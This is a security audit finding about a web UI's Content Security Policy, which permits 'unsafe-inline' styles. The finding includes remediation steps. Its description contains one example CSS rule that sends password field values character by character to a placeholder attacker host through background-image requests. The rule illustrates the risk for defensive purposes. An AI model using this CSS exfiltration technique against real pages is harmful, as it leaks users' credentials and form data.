# F-016: CSP allows `'unsafe-inline'` for `style-src`

| Field | Value |
|---|---|
| Severity | Low |
| CWE | CWE-1021 (Improper Restriction of Rendered UI Layers) |
| CVSS-like | 3.5 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N) |
| Location | `server/src/zaqorincore_server/security.py:30-39` |
| Status | Open |

## Description

The bundled WebUI (`webui/index.html`) has a 175-line `<style>` block inline in the
`<head>`. The CSP reflects that:

```python
_CSP = (
    "default-src 'self'; "
    "script-src 'self' https://esm.sh; "
    "style-src 'self' 'unsafe-inline'; "        # <-- here
    ...
)
```

`'unsafe-inline'` for styles defeats a meaningful slice of CSP-based XSS containment.
A successful script injection that the CSP `script-src` blocks (because the attacker
does not control `https://esm.sh` and `'self'` does not include the injected code)
can still exfiltrate data via injected `<style>` blocks: a CSS rule like
`input[type=password][value^=a] { background: url('https://attacker/?a'); }`
character-by-character exfiltrates form values via background requests, which
CSP-`style-src` blocks when `'unsafe-inline'` is removed.

## Impact

* **CSS-based exfiltration** — if an XSS does land in the WebUI (e.g. via a future
  server-side render of an alert's `summary` field), CSP cannot prevent a CSS-channel
  exfiltration of operator-input forms.
* **Inert style attacks** — injected `<style>` cannot call JavaScript but can completely
  rewrite the WebUI's appearance (clickjacking-style UI redress) for the operator
  while they are authenticated.

## POC sketch

A future XSS bug in the WebUI that injects a single `<style>` tag can exfiltrate
form-field contents character by character via `background: url(...)` even when
`script-src 'self' https://esm.sh` is otherwise locked down.

## Remediation sketch

1. Move the inline `<style>` from `index.html` into `webui/static/app.css` (or a
   vendored stylesheet under `webui/static/vendor/`).
2. Replace `style-src 'self' 'unsafe-inline'` with `style-src 'self'`.
3. If a third-party component requires inline styles, use a nonce:
   `style-src 'self' 'nonce-<random>'` and have the server emit the nonce per
   response.